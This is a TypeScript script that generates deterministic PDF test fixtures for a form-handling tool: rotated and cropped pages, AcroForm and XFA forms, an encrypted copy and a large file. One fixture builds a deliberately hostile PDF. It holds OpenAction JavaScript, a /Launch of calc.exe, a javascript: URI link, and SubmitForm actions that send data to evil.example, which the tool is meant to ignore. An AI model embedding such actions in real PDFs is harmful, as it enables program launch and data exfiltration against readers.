// SPDX-License-Identifier: GPL-3.0-or-later
// Generated test fixtures (requirements Appendix A.4, spec §14.2):
//
//   pnpm fixtures:make
//
// Writes fixtures/vendored/generated/*.pdf and upserts their entries in fixtures/manifest.json.
// Every file is deterministic (fixed dates, seeded noise, no object streams) except the encrypted
// copy, whose AES salt and IV qpdf randomizes; its manifest hash is refreshed on each run. Needs
// qpdf on PATH for that copy (`brew install qpdf`).
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { deflateSync } from 'node:zlib';
import {
  PDFDocument,
  PDFDict,
  PDFName,
  PDFString,
  StandardFonts,
  degrees,
  rgb,
  type PDFFont,
  type PDFPage,
} from '@cantoo/pdf-lib';

const root = new URL('../../', import.meta.url);
const outDir = new URL('fixtures/vendored/generated/', root);
const manifestUrl = new URL('fixtures/manifest.json', root);
const FIXED_DATE = new Date('2026-01-01T00:00:00Z');
const LETTER: [number, number] = [612, 792];

export interface ManifestEntry {
  path: string;
  source: string;
  license: string;
  sha256: string;
  formType: 'acroform' | 'xfa' | 'flat';
  xfa: 'none' | 'hybrid' | 'dynamic';
  encrypted: boolean;
  password: string | null;
  cipher?: string;
  rotation: number[];
  cropOrigin: boolean;
  pageCount: number;
  purpose: string;
  committed: boolean;
  fieldKinds?: string[];
  features?: string[];
  /** Registration marks: page index and centre in unrotated PDF points (X5). */
  marks?: { page: number; x: number; y: number }[];
  bytes?: number;
}

const MARKS = [
  { x: 100, y: 100 },
  { x: 306, y: 396 },
  { x: 500, y: 700 },
];

async function newDocument(title: string): Promise<{ doc: PDFDocument; font: PDFFont }> {
  const doc = await PDFDocument.create();
  doc.setTitle(title);
  doc.setAuthor('Bogey test fixtures');
  doc.setProducer('Bogey make-fixtures');
  doc.setCreator('Bogey make-fixtures');
  doc.setCreationDate(FIXED_DATE);
  doc.setModificationDate(FIXED_DATE);
  return { doc, font: await doc.embedFont(StandardFonts.Helvetica) };
}

/** A cross 12 pt wide with a 2 pt filled square at its centre, and its coordinates as text. */
function drawMark(page: PDFPage, font: PDFFont, x: number, y: number) {
  const black = rgb(0, 0, 0);
  page.drawLine({ start: { x: x - 6, y }, end: { x: x + 6, y }, thickness: 0.5, color: black });
  page.drawLine({ start: { x, y: y - 6 }, end: { x, y: y + 6 }, thickness: 0.5, color: black });
  page.drawRectangle({ x: x - 1, y: y - 1, width: 2, height: 2, color: black });
  page.drawText(`(${x}, ${y})`, { x: x + 8, y: y + 8, size: 7, font, color: black });
}

function heading(page: PDFPage, font: PDFFont, text: string) {
  const { x, y, height } = page.getCropBox();
  page.drawText(text, { x: x + 36, y: y + height - 48, size: 14, font });
}

async function save(doc: PDFDocument, name: string): Promise<Uint8Array> {
  const bytes = await doc.save({ useObjectStreams: false });
  writeFileSync(new URL(name, outDir), bytes);
  return bytes;
}

const sha256 = (bytes: Uint8Array) => createHash('sha256').update(bytes).digest('hex');

function entry(
  name: string,
  bytes: Uint8Array,
  rest: Omit<ManifestEntry, 'path' | 'source' | 'license' | 'sha256' | 'committed'>,
): ManifestEntry {
  return {
    path: `fixtures/vendored/generated/${name}`,
    source: 'generated',
    license: 'GPL-3.0-or-later',
    sha256: sha256(bytes),
    committed: true,
    ...rest,
  };
}

/** Flat pages: single page, one page per rotation, multi-page with every rotation, crop box. */
async function flatFixtures(): Promise<ManifestEntry[]> {
  const entries: ManifestEntry[] = [];

  {
    const { doc, font } = await newDocument('Flat single page');
    const page = doc.addPage(LETTER);
    heading(page, font, 'Flat single page: boxes drawn, no form fields');
    for (const [i, label] of ['Name', 'Date', 'Signature'].entries()) {
      const y = 600 - i * 60;
      page.drawText(label, { x: 72, y: y + 6, size: 10, font });
      page.drawRectangle({
        x: 150,
        y,
        width: 300,
        height: 24,
        borderWidth: 0.75,
        borderColor: rgb(0, 0, 0),
      });
    }
    page.drawRectangle({
      x: 150,
      y: 400,
      width: 12,
      height: 12,
      borderWidth: 0.75,
      borderColor: rgb(0, 0, 0),
    });
    page.drawText('I agree (a drawn box, not a field)', { x: 170, y: 402, size: 10, font });
    for (const mark of MARKS) drawMark(page, font, mark.x, mark.y);
    const bytes = await save(doc, 'flat-single.pdf');
    entries.push(
      entry('flat-single.pdf', bytes, {
        formType: 'flat',
        xfa: 'none',
        encrypted: false,
        password: null,
        rotation: [0],
        cropOrigin: false,
        pageCount: 1,
        purpose: 'Flat single page with drawn boxes and registration marks',
        marks: MARKS.map((m) => ({ page: 0, ...m })),
      }),
    );
  }

  for (const rotation of [0, 90, 180, 270]) {
    const { doc, font } = await newDocument(`Rotate ${rotation}`);
    const page = doc.addPage(LETTER);
    page.setRotation(degrees(rotation));
    heading(page, font, `/Rotate ${rotation}: marks at known PDF coordinates`);
    for (const mark of MARKS) drawMark(page, font, mark.x, mark.y);
    const name = `rotate-${rotation}.pdf`;
    const bytes = await save(doc, name);
    entries.push(
      entry(name, bytes, {
        formType: 'flat',
        xfa: 'none',
        encrypted: false,
        password: null,
        rotation: [rotation],
        cropOrigin: false,
        pageCount: 1,
        purpose: `Registration marks on a page with /Rotate ${rotation} (X5)`,
        marks: MARKS.map((m) => ({ page: 0, ...m })),
      }),
    );
  }

  {
    const { doc, font } = await newDocument('Multi-page rotations');
    const marks: NonNullable<ManifestEntry['marks']> = [];
    for (const [index, rotation] of [0, 90, 180, 270].entries()) {
      const page = doc.addPage(LETTER);
      page.setRotation(degrees(rotation));
      heading(page, font, `Page ${index + 1}, /Rotate ${rotation}`);
      for (const mark of MARKS) {
        drawMark(page, font, mark.x, mark.y);
        marks.push({ page: index, ...mark });
      }
    }
    const bytes = await save(doc, 'multipage-rotations.pdf');
    entries.push(
      entry('multipage-rotations.pdf', bytes, {
        formType: 'flat',
        xfa: 'none',
        encrypted: false,
        password: null,
        rotation: [0, 90, 180, 270],
        cropOrigin: false,
        pageCount: 4,
        purpose: 'Flat multi-page, one page per rotation (V5)',
        marks,
      }),
    );
  }

  {
    const { doc, font } = await newDocument('Crop box offset');
    const page = doc.addPage([700, 900]);
    page.setCropBox(50, 80, 612, 792);
    heading(page, font, 'Crop box origin at (50, 80) inside a 700 x 900 media box');
    const marks = MARKS.map((m) => ({ page: 0, x: m.x + 50, y: m.y + 80 }));
    for (const mark of marks) drawMark(page, font, mark.x, mark.y);
    const bytes = await save(doc, 'cropbox-offset.pdf');
    entries.push(
      entry('cropbox-offset.pdf', bytes, {
        formType: 'flat',
        xfa: 'none',
        encrypted: false,
        password: null,
        rotation: [0],
        cropOrigin: true,
        pageCount: 1,
        purpose: 'Non-zero crop box origin (X3, X5)',
        marks,
      }),
    );
  }

  {
    const { doc, font } = await newDocument('Crop box offset, rotated 90');
    const page = doc.addPage([700, 900]);
    page.setCropBox(50, 80, 612, 792);
    page.setRotation(degrees(90));
    heading(page, font, 'Crop box origin (50, 80) and /Rotate 90');
    const marks = MARKS.map((m) => ({ page: 0, x: m.x + 50, y: m.y + 80 }));
    for (const mark of marks) drawMark(page, font, mark.x, mark.y);
    const bytes = await save(doc, 'cropbox-offset-rotate-90.pdf');
    entries.push(
      entry('cropbox-offset-rotate-90.pdf', bytes, {
        formType: 'flat',
        xfa: 'none',
        encrypted: false,
        password: null,
        rotation: [90],
        cropOrigin: true,
        pageCount: 1,
        purpose: 'Crop box offset combined with rotation (X3)',
        marks,
      }),
    );
  }

  return entries;
}

/** One of every supported field type, named predictably (A.4), plus a push button. */
async function buildAcroForm(): Promise<PDFDocument> {
  const { doc, font } = await newDocument('AcroForm, every field type');
  const page = doc.addPage(LETTER);
  const form = doc.getForm();
  heading(page, font, 'AcroForm with one of every field type');
  const label = (text: string, y: number) =>
    page.drawText(text, { x: 72, y: y + 6, size: 10, font });

  label('text1', 680);
  form.createTextField('text1').addToPage(page, { x: 180, y: 676, width: 300, height: 22, font });

  label('multiline1', 600);
  const multiline = form.createTextField('multiline1');
  multiline.enableMultiline();
  multiline.addToPage(page, { x: 180, y: 580, width: 300, height: 60, font });

  label('comb1 (9)', 540);
  const comb = form.createTextField('comb1');
  comb.setMaxLength(9);
  comb.enableCombing();
  comb.addToPage(page, { x: 180, y: 536, width: 216, height: 22, font });

  label('check1', 500);
  form.createCheckBox('check1').addToPage(page, { x: 180, y: 498, width: 14, height: 14 });

  label('radio1', 460);
  const radio = form.createRadioGroup('radio1');
  for (const [i, option] of ['a', 'b', 'c'].entries()) {
    radio.addOptionToPage(option, page, { x: 180 + i * 40, y: 458, width: 14, height: 14 });
  }

  label('dropdown1', 420);
  const dropdown = form.createDropdown('dropdown1');
  dropdown.addOptions(['Alpha', 'Beta', 'Gamma']);
  dropdown.addToPage(page, { x: 180, y: 416, width: 160, height: 22, font });

  label('list1', 360);
  const list = form.createOptionList('list1');
  list.addOptions(['One', 'Two', 'Three', 'Four']);
  list.enableMultiselect();
  list.addToPage(page, { x: 180, y: 320, width: 160, height: 60, font });

  label('readonly1', 280);
  const readOnly = form.createTextField('readonly1');
  readOnly.setText('Fixed value');
  readOnly.enableReadOnly();
  readOnly.addToPage(page, { x: 180, y: 276, width: 300, height: 22, font });

  label('button1', 240);
  form
    .createButton('button1')
    .addToPage('Press', page, { x: 180, y: 236, width: 80, height: 22, font });

  return doc;
}

const ACROFORM_KINDS = ['text', 'checkbox', 'radio', 'dropdown', 'list', 'button'];

async function formFixtures(): Promise<ManifestEntry[]> {
  const entries: ManifestEntry[] = [];

  const acroform = await buildAcroForm();
  const bytes = await save(acroform, 'acroform-all.pdf');
  entries.push(
    entry('acroform-all.pdf', bytes, {
      formType: 'acroform',
      xfa: 'none',
      encrypted: false,
      password: null,
      rotation: [0],
      cropOrigin: false,
      pageCount: 1,
      purpose: 'One of every field type, named predictably (F1, F4, F5)',
      fieldKinds: ACROFORM_KINDS,
      features: ['comb', 'max-length', 'multiline', 'read-only', 'multiselect'],
    }),
  );

  // Hybrid XFA: the same AcroForm plus an XFA stream that duplicates it (D4, spec §6.2). The
  // pdf-lib fork strips XFA whenever getForm() runs, saving included, unless the document was
  // loaded with preserveXFA, so the stream is added to a reloaded copy.
  const hybrid = await PDFDocument.load(
    await (await buildAcroForm()).save({ useObjectStreams: false }),
    {
      preserveXFA: true,
      updateMetadata: false,
    },
  );
  hybrid.setTitle('Hybrid XFA');
  const xfa = hybrid.context.stream(
    '<?xml version="1.0"?><xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">' +
      '<template xmlns="http://www.xfa.org/schema/xfa-template/3.3/"><subform name="form1">' +
      '<field name="text1"/></subform></template></xdp:xdp>',
  );
  hybrid.getForm().acroForm.dict.set(PDFName.of('XFA'), hybrid.context.register(xfa));
  const hybridBytes = await save(hybrid, 'xfa-hybrid.pdf');
  entries.push(
    entry('xfa-hybrid.pdf', hybridBytes, {
      formType: 'xfa',
      xfa: 'hybrid',
      encrypted: false,
      password: null,
      rotation: [0],
      cropOrigin: false,
      pageCount: 1,
      purpose: 'XFA with a complete AcroForm fallback (D4 hybrid)',
      fieldKinds: ACROFORM_KINDS,
    }),
  );

  // Dynamic XFA: a placeholder page, an AcroForm with no fields, /NeedsRendering true.
  const { doc: dynamic, font } = await newDocument('Dynamic XFA');
  const page = dynamic.addPage(LETTER);
  page.drawText('Please wait...', { x: 72, y: 700, size: 18, font });
  page.drawText('If this message is not eventually replaced by the proper contents of the', {
    x: 72,
    y: 670,
    size: 10,
    font,
  });
  page.drawText('document, your PDF viewer may not be able to display this type of document.', {
    x: 72,
    y: 656,
    size: 10,
    font,
  });
  const acro = dynamic.context.obj({ Fields: [] });
  acro.set(
    PDFName.of('XFA'),
    dynamic.context.register(
      dynamic.context.stream(
        '<?xml version="1.0"?><xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"></xdp:xdp>',
      ),
    ),
  );
  dynamic.catalog.set(PDFName.of('AcroForm'), dynamic.context.register(acro));
  dynamic.catalog.set(PDFName.of('NeedsRendering'), dynamic.context.obj(true));
  const dynamicBytes = await save(dynamic, 'xfa-dynamic.pdf');
  entries.push(
    entry('xfa-dynamic.pdf', dynamicBytes, {
      formType: 'xfa',
      xfa: 'dynamic',
      encrypted: false,
      password: null,
      rotation: [0],
      cropOrigin: false,
      pageCount: 1,
      purpose: 'Dynamic XFA placeholder page (D4 dynamic)',
    }),
  );

  // Encrypted copy of the AcroForm fixture (D3, E9): AES-256, user password "bogey".
  const encryptedName = 'acroform-all-aes256.pdf';
  execFileSync('qpdf', [
    '--encrypt',
    'bogey',
    'bogey-owner',
    '256',
    '--',
    new URL('acroform-all.pdf', outDir).pathname,
    new URL(encryptedName, outDir).pathname,
  ]);
  const encrypted = readFileSync(new URL(encryptedName, outDir));
  entries.push(
    entry(encryptedName, encrypted, {
      formType: 'acroform',
      xfa: 'none',
      encrypted: true,
      password: 'bogey',
      cipher: 'AES-256',
      rotation: [0],
      cropOrigin: false,
      pageCount: 1,
      purpose: 'Password-protected copy of acroform-all (user password "bogey")',
      fieldKinds: ACROFORM_KINDS,
    }),
  );

  return entries;
}

/** A deterministic noise PNG: incompressible, so twenty of them make a ~10 MB document. */
function noisePng(width: number, height: number, seed: number): Uint8Array {
  let state = seed >>> 0 || 1;
  const next = () => {
    state ^= state << 13;
    state ^= state >>> 17;
    state ^= state << 5;
    return state >>> 0;
  };
  const raw = Buffer.alloc((width * 3 + 1) * height);
  for (let y = 0; y < height; y++) {
    const row = y * (width * 3 + 1);
    raw[row] = 0;
    for (let i = 1; i <= width * 3; i++) raw[row + i] = next() & 0xff;
  }
  const chunk = (type: string, data: Buffer) => {
    const length = Buffer.alloc(4);
    length.writeUInt32BE(data.length);
    const body = Buffer.concat([Buffer.from(type, 'latin1'), data]);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crc32(body));
    return Buffer.concat([length, body, crc]);
  };
  const header = Buffer.alloc(13);
  header.writeUInt32BE(width, 0);
  header.writeUInt32BE(height, 4);
  header[8] = 8; // bit depth
  header[9] = 2; // RGB
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk('IHDR', header),
    chunk('IDAT', deflateSync(raw, { level: 1 })),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

const CRC_TABLE = Array.from({ length: 256 }, (_, n) => {
  let c = n;
  for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
  return c >>> 0;
});

function crc32(bytes: Uint8Array): number {
  let crc = 0xffffffff;
  for (const byte of bytes) crc = CRC_TABLE[(crc ^ byte) & 0xff]! ^ (crc >>> 8);
  return (crc ^ 0xffffffff) >>> 0;
}

async function largeFixture(): Promise<ManifestEntry> {
  const { doc, font } = await newDocument('Large document');
  for (let index = 0; index < 20; index++) {
    const page = doc.addPage(LETTER);
    heading(page, font, `Large document, page ${index + 1} of 20`);
    const image = await doc.embedPng(noisePng(420, 400, index + 1));
    page.drawImage(image, { x: 96, y: 200, width: 420, height: 400 });
  }
  const bytes = await save(doc, 'large-20p.pdf');
  return entry('large-20p.pdf', bytes, {
    formType: 'flat',
    xfa: 'none',
    encrypted: false,
    password: null,
    rotation: [0],
    cropOrigin: false,
    pageCount: 20,
    purpose: '20 pages, about 10 MB, embedded images (E7, V6)',
    bytes: bytes.length,
  });
}

/**
 * Hostile active content (spec §9.1 step 4, §11.4, §14.5): an /OpenAction JavaScript chained to a
 * /Launch, document-level JavaScript, catalog, page and field additional actions, a link with a
 * /Launch action, a link with a `javascript:` URI, a SubmitForm button, and a text field named
 * `__proto__`. Bogey must run none of it, follow none of it, and export none of it.
 */
export const HOSTILE_LINKS = {
  launch: [72, 600, 300, 624],
  javascriptUri: [72, 540, 300, 564],
} as const;

async function hostileFixture(): Promise<ManifestEntry> {
  const { doc, font } = await newDocument('Hostile actions');
  const page = doc.addPage(LETTER);
  const ctx = doc.context;
  const N = PDFName.of;
  const action = (type: string, rest: Record<string, unknown>) =>
    ctx.register(ctx.obj({ Type: 'Action', S: type, ...rest }));
  const js = (code: string) => action('JavaScript', { JS: PDFString.of(code) });
  const launch = () => action('Launch', { F: PDFString.of('calc.exe'), NewWindow: true });

  heading(page, font, 'Hostile actions: nothing here may run, open or navigate');
  const text = (line: string, x: number, y: number) =>
    page.drawText(line, { x, y, size: 10, font });
  const box = ([x0, y0, x1, y1]: readonly number[]) =>
    page.drawRectangle({
      x: x0!,
      y: y0!,
      width: x1! - x0!,
      height: y1! - y0!,
      borderWidth: 0.75,
      borderColor: rgb(0.6, 0, 0),
    });

  // Document level: an OpenAction script whose /Next launches a program, a named script, and
  // catalog and page additional actions.
  const open = js("app.alert('OpenAction ran'); this.submitForm('https://evil.example/open');");
  ctx.lookup(open, PDFDict).set(N('Next'), launch());
  doc.catalog.set(N('OpenAction'), open);
  const names = ctx.obj({ Names: [PDFString.of('init'), js("app.alert('document script ran')")] });
  doc.catalog.set(N('Names'), ctx.obj({ JavaScript: ctx.register(names) }));
  doc.catalog.set(N('AA'), ctx.obj({ WC: js("app.alert('will close')") }));
  page.node.set(N('AA'), ctx.obj({ O: js("app.alert('page opened')") }));

  // Links: a /Launch and a javascript: URI.
  const link = (rect: readonly number[], a: unknown) =>
    ctx.register(
      ctx.obj({ Type: 'Annot', Subtype: 'Link', Rect: [...rect], Border: [0, 0, 0], A: a }),
    );
  box(HOSTILE_LINKS.launch);
  text('Link: Launch calc.exe', HOSTILE_LINKS.launch[0] + 6, HOSTILE_LINKS.launch[1] + 8);
  box(HOSTILE_LINKS.javascriptUri);
  text(
    'Link: javascript: URI',
    HOSTILE_LINKS.javascriptUri[0] + 6,
    HOSTILE_LINKS.javascriptUri[1] + 8,
  );
  const links = [
    link(HOSTILE_LINKS.launch, launch()),
    link(
      HOSTILE_LINKS.javascriptUri,
      action('URI', { URI: PDFString.of("javascript:alert('link ran')") }),
    ),
  ];

  // Form: an ordinary text field with keystroke and format scripts, a field named __proto__, and
  // a button that submits the form elsewhere.
  const form = doc.getForm();
  text('name', 72, 486);
  const name = form.createTextField('name');
  name.addToPage(page, { x: 180, y: 480, width: 240, height: 22, font });
  name.acroField
    .getWidgets()[0]!
    .dict.set(
      N('AA'),
      ctx.obj({ K: js("app.alert('keystroke')"), F: js("event.value = 'formatted'") }),
    );
  text('__proto__', 72, 446);
  form
    .createTextField('__proto__')
    .addToPage(page, { x: 180, y: 440, width: 240, height: 22, font });
  text('submit', 72, 406);
  const submit = form.createButton('submit');
  submit.addToPage('Send', page, { x: 180, y: 400, width: 80, height: 22, font });
  submit.acroField.getWidgets()[0]!.dict.set(
    N('A'),
    action('SubmitForm', {
      F: ctx.obj({ FS: 'URL', F: PDFString.of('https://evil.example/collect') }),
    }),
  );

  const annots = page.node.Annots();
  for (const ref of links) annots?.push(ref);
  if (!annots) page.node.set(N('Annots'), ctx.obj(links));

  const bytes = await save(doc, 'hostile-actions.pdf');
  return entry('hostile-actions.pdf', bytes, {
    formType: 'acroform',
    xfa: 'none',
    encrypted: false,
    password: null,
    rotation: [0],
    cropOrigin: false,
    pageCount: 1,
    purpose:
      'Hostile active content: OpenAction JavaScript and Launch, document JavaScript, additional actions, a Launch link, a javascript: URI link, SubmitForm, a field named __proto__ (spec §11.4)',
    fieldKinds: ['text', 'button'],
    features: ['javascript', 'launch', 'link', 'submit-form', 'proto-field-name'],
  });
}

/** Upserts entries by path, keeping every other entry and a stable order. */
export function mergeManifest(
  existing: ManifestEntry[],
  updates: ManifestEntry[],
): ManifestEntry[] {
  const byPath = new Map(existing.map((e) => [e.path, e]));
  for (const update of updates) byPath.set(update.path, update);
  return [...byPath.values()].sort((a, b) => a.path.localeCompare(b.path));
}

async function main() {
  mkdirSync(outDir, { recursive: true });
  const generated = [
    ...(await flatFixtures()),
    ...(await formFixtures()),
    await largeFixture(),
    await hostileFixture(),
  ];
  let existing: ManifestEntry[] = [];
  try {
    existing = JSON.parse(readFileSync(manifestUrl, 'utf8')) as ManifestEntry[];
  } catch {
    existing = [];
  }
  const manifest = mergeManifest(existing, generated);
  writeFileSync(manifestUrl, `${JSON.stringify(manifest, null, 2)}\n`);
  for (const e of generated) console.log(`${e.sha256.slice(0, 12)}  ${e.path}`);
}

await main();
